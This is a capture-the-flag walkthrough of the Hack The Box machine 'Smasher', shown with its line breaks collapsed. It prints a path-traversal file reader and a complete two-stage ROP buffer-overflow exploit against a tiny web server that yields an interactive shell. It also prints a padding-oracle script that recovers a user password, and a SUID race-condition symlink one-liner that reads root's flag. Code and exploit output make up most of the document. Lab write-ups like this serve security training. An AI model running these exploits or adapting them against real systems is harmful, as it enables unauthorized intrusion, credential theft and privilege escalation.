a small python script to fix the output and sort the results to make it easier to work with:#!/usr/bin/pythonfrom pwn import *import sysimport requestscontext.log_level = 'info'ls = []r = requests.get('http://10.10.10.89:1111/../../../../../%s' % (sys.argv[1]))if '&lt;tr&gt;' in r.text:    for line in r.text.splitlines():        if '&lt;tr&gt;' in line:            # print(line.split('\"')[1])            ls.append(line.split('\"')[1])    for i in (sorted(ls)):        print(i)else:    print r.textWe find the list of users in /etc/passwdroot@kali:~/hackthebox/Machines/Smasher# python scanner.py /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/falsesyslog:x:104:108::/home/syslog:/bin/false_apt:x:105:65534::/nonexistent:/bin/falsemessagebus:x:106:110::/var/run/dbus:/bin/falseuuidd:x:107:111::/run/uuidd:/bin/falsesshd:x:108:65534::/var/run/sshd:/usr/sbin/nologinwww:x:1000:1000:www,,,:/home/www:/bin/bashsmasher:x:1001:1001:,,,:/home/smasher:/bin/bashwww and smasher home directories are probably where we want to look next:We can‚Äôt read the home directory of smasher:root@kali:~/hackthebox/Machines/Smasher# python scanner.py /home/smasherFile not foundBut we can read what‚Äôs in www:root@kali:~/hackthebox/Machines/Smasher# python scanner.py /home/www.bash_logout.bashrc.cache/.profile.python_history.ssh/restart.shtiny-web-server/Inside the web server directory, we can see that the Makefile has been modified to disable the stack protector and DEP/NX. This is our hint that we are probably looking at a buffer overflow exploit to get user access on this machine.root@kali:~/hackthebox/Machines/Smasher# python scanner.py /home/www/tiny-web-server.git/MakefileREADME.mdpublic_html/tinytiny.croot@kali:~/hackthebox/Machines/Smasher# python scanner.py /home/www/tiny-web-server/MakefileCC = c99CFLAGS = -Wall -O2# LIB = -lpthreadall: tinytiny: tiny.c    $(CC) $(CFLAGS) -g -fno-stack-protector -z execstack -o tiny tiny.c $(LIB)clean:    rm -f *.o tiny *~Next, we‚Äôll grab the binary file and check if it‚Äôs compiled with additional protections:oot@kali:~/hackthebox/Machines/Smasher# nc -nv 10.10.10.89 1111 &gt; tiny(UNKNOWN) [10.10.10.89] 1111 (?) openGET ../../../../home/www/tiny-web-server/tinyWe edit the file with vi and strip the HTTP headers, then we get a clean ELF file:root@kali:~/hackthebox/Machines/Smasher# file tinytiny: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b872377623aa9e081bc7d72c8dbe882f03bf66b7, with debug_info, not strippedroot@kali:~/hackthebox/Machines/Smasher# checksec tiny[*] '/root/hackthebox/Machines/Smasher/tiny'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE    FORTIFY:  EnabledBuffer overflowThere‚Äôs an overflow in the GET parameter: if we send more than 568 characters in the GET request it‚Äôll crash. Because we have the binary and we can look around the file system we can:  Check the PLT/GOT offsets in the binary  Determine the libc version running on the target systemTo find the libc base address, we‚Äôll construct a rop chain and use the read function already present in the PLT. By chance, the RDX register is already set to a large value so we don‚Äôt need to find a gadget to mess with it. The binary contains POP RDI and POP RSI gadgets so we can pass the right parameters to the read function and dump a chunk of memory.Calculating the libc address is a matter of fetching the read address from the GOT, then substracting its offset (which we know because we have the libc version). After, we‚Äôll calculate the memory address for system, dup2 and the /bin/sh string.We need to build a ROP chain that calls dup2 first so we can redirect stdin and stdout to the socket.The final exploit is:#!/usr/bin/pythonfrom pwn import *import urllibimport sysr = remote('10.10.10.89', 1111)fd = 4offset = 568junk = p64(0xAABBAABBAABBAABB)plt_read = p64(0x400cf0)plt_write = p64(0x400c50)poprdi = p64(0x4011dd)poprsi = p64(0x4011db)payload_stage1 = ''payload_stage1 += 'A' * offsetpayload_stage1 += poprdi + p64(fd)payload_stage1 += poprsi + p64(0x603088) + junkpayload_stage1 += plt_writer.send('GET /%s\\n\\n' % urllib.quote(payload_stage1))buf = r.recv().split('File not found')[1][0:8]read_addr = u64(buf)libc_base = read_addr - 0xf7250    # https://libc.blukat.me/?q=_rtld_global%3A0&amp;l=libc6_2.23-0ubuntu10_amd64system_addr = libc_base + 0x45390str_bin_sh = libc_base + 0x18cd57dup2 = libc_base + 0xf7970log.info('libc base address is: %s' % hex(libc_base))log.info('read address is : %s' % hex(read_addr))log.info('system address is: %s' % hex(system_addr))log.info('dup2 address is: %s' % hex(dup2))log.info('/bin/sh address is: %s' % hex(str_bin_sh))r2 = remote('10.10.10.89', 1111)payload_stage2 = ''payload_stage2 += 'A' * offsetpayload_stage2 += poprdi + p64(fd)payload_stage2 += poprsi + p64(0x0) + junkpayload_stage2 += p64(dup2)payload_stage2 += poprdi + p64(fd)payload_stage2 += poprsi + p64(0x1) + junkpayload_stage2 += p64(dup2)payload_stage2 += poprdi + p64(str_bin_sh)payload_stage2 += p64(system_addr)r2.send('GET /%s\\n\\n' % urllib.quote(payload_stage2))r2.recvuntil('File not found')r2.interactive()The exploit in action:root@kali:~/hackthebox/Machines/Smasher# python exploit.py [+] Opening connection to 10.10.10.89 on port 1111: Done[*] libc base address is: 0x7f561f10e000[*] read address is : 0x7f561f205250[*] system address is: 0x7f561f153390[*] dup2 address is: 0x7f561f205970[*] /bin/sh address is: 0x7f561f29ad57[+] Opening connection to 10.10.10.89 on port 1111: Done[*] Switching to interactive mode$ iduid=1000(www) gid=1000(www) groups=1000(www)After getting that shell, we can add our SSH public key to /home/www/.ssh/authorized_keys so we can log in directly without using the exploit.root@kali:~# ssh www@10.10.10.89Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-124-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantageLast login: Tue Jun 12 01:34:47 2018 from 10.10.14.23Oracle paddingThere‚Äôs a hidden service runnning on port 1337 which prompts for a ciphertext string:www@smasher:~$ netstat -panut |more(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (servers and established)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nametcp        0      0 0.0.0.0:1111            0.0.0.0:*               LISTEN      29166/tiny      tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      -               tcp        0      0 0.0.0.0:1338            0.0.0.0:*               LISTEN      8562/socat      tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - www@smasher:~$ nc 127.0.0.1 1337[*] Welcome to AES Checker! (type 'exit' to quit)[!] Crack this one: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==Insert ciphertext: testGeneric error, ignore me!This looks like a challenge which can be solved through an Oracle Padding attack.To solve this we‚Äôll modify the following script: https://github.com/twd2/padding-oracle-attack/blob/master/attack.pyNote: latest version of pwntools needs to be installed for Python3 in order for this to work: pip3 install --upgrade git+https://github.com/arthaud/python3-pwntools.gitimport sysimport timeimport urllibimport urllib.parseimport urllib.requestimport randomimport argparseimport binasciifrom pwn import *import base64def api(data):  print(data)  r = remote(\"10.10.10.89\",1338,level='warn')  r.recvuntil(\"Insert ciphertext: \")  r.sendline(base64.b64encode(binascii.unhexlify(data)))  print(base64.b64encode(binascii.unhexlify(data)))  tmp = r.recvuntil('Insert ciphertext:').decode(\"utf-8\")  r.close()  if 'OK!' in tmp:    return True  if 'Invalid' in tmp:    return Falsedef is_valid(iv, c):  # Test if the padding of (iv ^ c^(-1)) is valid.  data = binascii.hexlify(bytearray(iv)).decode() + binascii.hexlify(bytearray(c)).decode()  # print(data)  return api(data)def attack(data, block_id, is_valid):  if 16 * block_id + 32 &gt; len(data):    print('Block id is too large.')    exit(1)  c_p = list(data[16 * block_id:16 * block_id + 16]) # Previous cipher block  iv = [random.choice(range(256)) for i in range(0, 16)] # *Random* initialization vector is necessary.  c = data[16 * block_id + 16:16 * block_id + 32] # Current cipher block    plain = []  for n in range(1, 17): # Which byte (in reverse order)?    for i in range(0, 256): # All possibilities of iv[-n]      iv[-n] = i      if is_valid(iv, c): # Padding is valid, so (iv[-n] ^ c^(-1)[-n]) is n, (iv[-n] ^ n) is c^(-1)[-n].        break    # print(iv[-n] ^ n ^ c_p[-n], chr(iv[-n] ^ n ^ c_p[-n]))     # Calculate plain text.    # Note: (iv[-n] ^ n) is c^(-1)[-n], so ((iv[-n] ^ n) ^ c_p[-n]) == (c^(-1)[-n] ^ c_p[-n]) is (plain text)[-n].    plain.append(iv[-n] ^ n ^ c_p[-n])    for i in range(1, n + 1):      iv[-i] = iv[-i] ^ n ^ (n + 1)      # Note:      # For futher attack,      # For i in [1, n], we want (new iv[-i] ^ c^(-1)[-i]) to be (n + 1), so that we can attack c^(-1)[-(n + 1)] using padding oracle.      # In particular, for i == n, we want (new iv[-n] ^ c^(-1)[-n]) to be (n + 1), so new iv[-n] should be (c^(-1)[-n] ^ (n + 1)) == ((iv[-n] ^ n) ^ (n + 1)).      # In particular, for i in [1, n - 1], we want (new iv[-i] ^ c^(-1)[-i]) to be (n + 1). Please note that (iv[-i] ^ c^(-1)[-i]) is n, so new iv[-i] should be (c^(-1)[-i] ^ (n + 1)) == ((iv[-i] ^ n) ^ (n + 1))  plain.reverse()  return bytearray(plain)def main():  # Data from http://10.60.0.212:5757/generate  #data_hex = '74b6510402f53b1661b98a2cfee1f1b5d65753e5ca0ccb1356c0ef871a0118bc47c245dcb51dc51efd473e5f63f3a8c94818195d08d01e740f27d07b0893d0cd'  data_hex = '8ab466581ee825231bb410b842ea01d770c2d3c348d3a31b71610e73de2ad0e5cf6df8119be97dc4790f43bafb35d163a3a852a3ab6882a2d8213186a4fb1776'  data = binascii.unhexlify(data_hex)  for i in range(0, 3):    print(attack(data, i, is_valid).decode(), end='')if __name__ == '__main__':  main()We can redirect to the local 1337 port using socat: socat tcp-listen:1338,reuseaddr,fork tcp:localhost:1337Then we‚Äôll launch the script against port 1338 and let it run for a bit:python3 oracler.py &gt; oracler_output.txtA few lines stand out in the output:b'utEFLXzYEkBmxXPAN4g253DC08NI06MbcWEOc94q0OU=' user 'smasher' 42eb200bed0f389985bbe43762f1ba00cf6df8119be97dc4790f43bafb35d163b'CaH58wii128IH3ksvFujmc9t+BGb6X3EeQ9Duvs10WM='is: PaddingOraclde1ffb8adbdc35ac24caa42050f32100a3a852a3ab6882a2d8213186a4fb1776b'ujCJcv+cH+VbLFWs7SPHdaOoUqOraIKi2CExhqT7F3Y='eMaster123\\x06\\x06\\x06\\x06\\x06\\x06rBy putting this back together we get: user 'smasher' is: PaddingOracleMaster123We can log in with that user and get the first flag:root@kali:~# ssh smasher@10.10.10.89smasher@10.10.10.89's password: Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-124-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantageLast login: Tue Jun 12 01:24:51 2018 from 10.10.16.9smasher@smasher:~$ iduid=1001(smasher) gid=1001(smasher) groups=1001(smasher)smasher@smasher:~$ lscrackme.py  socat.sh  user.txtsmasher@smasher:~$ cat user.txtbaabc&lt;redacted&gt;PrivescThere‚Äôs a SUID file that‚Äôs interesting:smasher@smasher:~$ find / -perm /6000 2&gt;/dev/null/usr/bin/checkersmasher@smasher:~$ checker[+] Welcome to file UID checker 0.1 by dzonerzyMissing argumentssmasher@smasher:~$ file /usr/bin/checker/usr/bin/checker: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=33890d7446199d25dadc438fce63a78c3f377f95, not strippedThere‚Äôs a race condition in the file because it sleeps for 1 second before reading the file content, so we can exploit this by:  Creating a dummy file ‚Äòblah‚Äô with some junk it  Launch /usr/bin/checker against ‚Äòblah‚Äô, then sleep for 0.5 seconds  Delete ‚Äòblah‚Äô and replace it with a symlink to /root/root.txt  After the programs comes out of the sleep() function, it‚Äôll read root.txt because it‚Äôs running as rootsmasher@smasher:~$ rm blah;echo 123 &gt; blah;(/usr/bin/checker blah &amp;);sleep 0.5;rm blah;ln -s /root/root.txt blahrm: cannot remove 'blah': No such file or directory[+] Welcome to file UID checker 0.1 by dzonerzysmasher@smasher:~$ File UID: 1001Data:077af&lt;redacted&gt;Flag: 077af&lt;redacted&gt;"
  }
  
]

